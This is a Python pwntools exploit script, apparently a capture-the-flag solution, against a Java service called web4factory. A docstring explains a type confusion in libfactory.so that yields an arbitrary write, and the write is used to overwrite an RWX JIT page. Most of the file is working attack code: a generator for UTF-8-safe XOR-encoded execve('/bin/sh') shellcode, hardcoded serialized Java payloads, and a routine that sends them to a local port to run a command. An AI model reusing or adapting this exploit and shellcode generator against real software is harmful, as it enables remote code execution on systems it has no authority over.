#!/usr/bin/env python3

from pwn import *
import json
import binascii

context.arch = 'amd64'
debug = False

'''
This bug relies on three things:
- Web4Parser::parse_next_json will produce a `byte[]` array if there is a null byte in the string.
- Web4Connection::libfactory_parse then converts strings into Web4FactoryParser objects but not `byte[]`s
- The factory parser subprocess passes it's input into `libfactory.so` which assumes, without checking,
  that it is an instance of a Web4FactoryParser object

This means by having nulls in our config string it will send a `byte[]` to the parser which will cause a type
confusion of the `byte[]` as an instance of `class Web4FactoryParser` within `libfactory.so`:

public class Web4FactoryParser implements java.io.Serializable {
    Object input = null;
    byte[] parseData;
    Object a = null;
    byte[] error;
    Object b = null;
    ...
}

The `byte[]` overlaps with the object like so:

         byte[]        
    [  header  ]   [  header     ]
    [  header  ]   [  header     ]
    [  class   ]   [  header     ]
    [  length  ]   [  input      ]
    [  AAAA... ]   [  parseData  ]
    [    ...   ]   [  a          ]
    [    ...   ]   [  error      ]
    [    ...   ]   [  b          ]

See https://shipilev.net/jvm/objects-inside-out/#_header_array_length for more info

Normally `parseData` is an input string and `error` is an output message. When `libfactory.so` has a parse error,
it will write the remaining string into the `error` member. This error also stays in a buffer which is reused on
the next call. This means we can set the error bytes on one call, then use them on the second call. Since we can
control the `error` pointer with our type confusion and we can control the contents of the error being written,
we can turn this into an arbitrary write.

Now that we have an arbitrary write, lets look at what we can corrupt to get code execution. It turns out that
Java is very nice to us and gives us an RWX page with some JIT code. In fact, it is so nice that it lets us just
smash the first bytes of the page and it will actually run it for us immediately after we return from `libfactory.so`!

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       ...
       0x800000000        0x800002000 rwxp     2000 1000   /usr/lib/jvm/java-11-openjdk-amd64/lib/server/classes.jsa
       ...
```

We can easily use our arbitrary write to smash this code with a bunch of our own shellcode.
However the input is utf-8 encoded, so we have to write constrained shellcode for it.
This mostly means using XORs to encode bytes over 0x7f. See code below for how I did that.

This exploit is actually very stable because it only relies on logic bugs to get the type confusion,
and then uses reliable methods of executing shellcode without needing memory leaks.
'''

def make_utf8_mask(chunk):
    out = b''
    seq = []

    found = False
    for c in chunk:
        if c == 0 or c == 0x20 or c == ord('['):
            seq.append(-1)
            found = True
            continue
        if c < 0x7f:
            seq.append(0)
            continue
        found = True
        if len(seq) == 0 or seq[-1] < 1:
            seq.append(1)
            continue
        seq[-1] = seq[-1] + 1

    if not found:
        return None
    print(seq)

    out = b''
    for s in seq:
        assert(s != 1)
        if s == -1:
            out += b'\x41'
            continue
        out += ['\x20','','\u0080','\u0800'][s].encode('utf-8')
    print(seq, out)
    return out



# Generate shellcode with a stage one that xors the stage two to make it utf8
# This function is very fragile and must follow the following input format:
#   Every 4 bytes must follow these rules:
#    - If there are chars >0x7f they must be next to at least one other char >0x7f within the block of 4
#    - The last byte in the block of 4 must be <=0x7f
def generate_utf8_shellcode(code):
    todo = []
    out_code = b''
    for i in range(0, len(code), 4):
        chunk = code[i:i+4].ljust(4,b'\x00')
        print(list(map(hex,chunk)))
        mask = make_utf8_mask(chunk)
        if mask is None:
            out_code += chunk
            continue
        todo.append((i, mask))
        for c,x in zip(chunk, mask):
            out_code += bytes([c^x])
        print(list(map(hex,out_code[-4:])))

    pc = 0
    output = ''
    for t in todo:
        loc = t[0] + 1
        output += f'''
push {hex(u32(t[1]))} 
pop rcx
xor qword ptr [rax+{loc}], rcx
'''
        pc += 10
    print(output)
    res = asm(output)

    # Put RIP in RCX
    res = asm(f'''
push 1
pop rax
syscall
push {len(res) - 1 + 7}
pop rax
add rax, rcx
nop
''') + res
    return res + out_code

def make_shellcode(cmd):
    if type(cmd) != bytes:
        cmd = cmd.encode('latin-1')
    cmd = cmd.strip(b'\0') + b'\0'
    align_len = len(cmd) - 3
    if align_len % 4 != 0:
        cmd += b'A'*(4 - (align_len % 4))
    assert((len(cmd) - 3) % 4 == 0)
    print(repr(cmd))
    shellcode = asm(f'''
{'int3' if debug else 'nop'}
call get_cmd
{chr(10).join(".byte "+str(c) for c in cmd)}
get_cmd:
nop
nop
pop rax
nop
call get_sh
.ascii "/bin/sh"
.byte 0
get_sh:
pop rdi
push 0
pop rsi

// dash c
push 0x632d 
push rsp
pop rbx

// null
push rsi 
// command to run
push rax 
// dash c
push rbx 
// /bin/sh
push rdi 
push rsp
pop rsi

push 0x3b
pop rax
push 0
pop rdx
syscall
''')
    shellcode = generate_utf8_shellcode(shellcode)
    if debug:
        shellcode = b'\xcc\x90' + shellcode
    print(shellcode)
    print(binascii.hexlify(shellcode))
    assert(0 not in shellcode)
    js = json.dumps(shellcode.decode('utf-8'))
    print(js)
    return js




# For testing I talked directly to the subprocess
# To do that we need the base64 serialized data, which I just hardcoded
def test_direct():
    # data#"AAAABBBBCCCDDD"
    #pl1 = "rO0ABXNyACBpbnN0aXR1dGUubmF1dGlsdXMud2ViNGZhY3RvcnkuZ5L6g3mzz7vDAgAFTAABYXQAEkxqYXZhL2xhbmcvT2JqZWN0O1sAAWJ0AAJbQkwAAWNxAH4AAVsAAWRxAH4AAkwAAWVxAH4AAXhwdAAaQUFBQUJCQkJDQ0NDREREREVFRUVGRkZGwIB1cgACW0Ks8xf4BghU4AIAAHhwAAAAGUFBQUFCQkJCQ0NDQ0RERERFRUVFRkZGRgBwdXEAfgAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABw"

    # data#"\u0310j\u0001X\u000f\u0005j~XH\u0001\u0210h\u0080 AYH1H\u0001hAA  YH1H\u0005h   AYH1H\u0011h \u0080 YH1H\u0015h\u0080 AYH1H\u0019hAA  YH1H\u001dh A  YH1H%hA   YH1H)h AA YH1H-hA   YH1H1h   AYH1H9h   AYH1H=\u000eh/AAALS>/tmp/pwNEDAaR\u0010xRh(AAA\u000fBin/sHA\u007fJA~H\rCAAt\u001avpsWT^j\u001bxJAz/%A"
    pl1 = "rO0ABXNyACBpbnN0aXR1dGUubmF1dGlsdXMud2ViNGZhY3RvcnkuZ5L6g3mzz7vDAgAFTAABYXQAEkxqYXZhL2xhbmcvT2JqZWN0O1sAAWJ0AAJbQkwAAWNxAH4AAVsAAWRxAH4AAkwAAWVxAH4AAXhwdADIzJBqAVgPBWp+WEgByJBowoAgQVlIMUgBaEFBICBZSDFIBWggICBBWUgxSBFoIMKAIFlIMUgVaMKAIEFZSDFIGWhBQSAgWUgxSB1oIEEgIFlIMUglaEEgICBZSDFIKWggQUEgWUgxSC1oQSAgIFlIMUgxaCAgIEFZSDFIOWggICBBWUgxSD0OaC9BQUFMUz4vdG1wL3B3TkVEQWFSEHhSaChBQUEPQmluL3NIQX9KQX5IDUNBQXQadnBzV1Reaht4SkF6LyVBwIB1cgACW0Ks8xf4BghU4AIAAHhwAAAAx8yQagFYDwVqflhIAciQaMKAIEFZSDFIAWhBQSAgWUgxSAVoICAgQVlIMUgRaCDCgCBZSDFIFWjCgCBBWUgxSBloQUEgIFlIMUgdaCBBICBZSDFIJWhBICAgWUgxSCloIEFBIFlIMUgtaEEgICBZSDFIMWggICBBWUgxSDloICAgQVlIMUg9DmgvQUFBTFM+L3RtcC9wd05FREFhUhB4UmgoQUFBD0Jpbi9zSEF/SkF+SA1DQUF0GnZwc1dUXmobeEpBei8lQQBwdXEAfgAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABw"

    # Gets arb write to a given address
    # data#"\u0008\u0000\u0000\u0000\u0008\u0000\u0000\u0000AAAABBBBCCCCDDDD"
    #pl2 = "rO0ABXVyAAJbQqzzF/gGCFTgAgAAeHAAAAAYCAAAAAgAAABBQUFBQkJCQkNDQ0NERERE"

    # data#"\u0008\u0000\u0000\u0000\u0008\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0008\u0000\u0000\u0000FFFFFFFF"
    pl2 = "rO0ABXVyAAJbQqzzF/gGCFTgAgAAeHAAAAAYCAAAAAgAAAAAAAAACAAAAEZGRkZGRkZG"

    p = process(['/usr/bin/java','-cp','../target/web4factory.jar','-Dloader.main=institute.nautilus.web4factory.Web4Gateway','org.springframework.boot.loader.PropertiesLauncher'])
    input()
    p.sendline(pl1)
    p.sendline(pl2)
    p.interactive()


# Actually talk to the service and send the exploit
def run_shellcode(sc_js):
    p = remote('127.0.0.1',10652)

    # Make sure we are ready to talk
    p.sendline('a')
    print(p.readuntil('fault'))

    # First we need to populate the error message we will be writing to our address.
    # Send our json encoded utf-8 shellcode payload
    p.sendline('data#'+sc_js)
    p.sendline('access@factory@load@config')
    print(p.readuntil('fault'))

    # Now trigger the type confusion to get an arbitrary write to the rwx code at 0x800000010
    p.sendline('data#"\u0008\u0000\u0000\u0000\u0008\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0008\u0000\u0000\u0000FFFFFFFF"')
    p.sendline('access@factory@load@config')

    p.interactive()


sc_js = make_shellcode('ls>/tmp/pwned')
run_shellcode(sc_js)
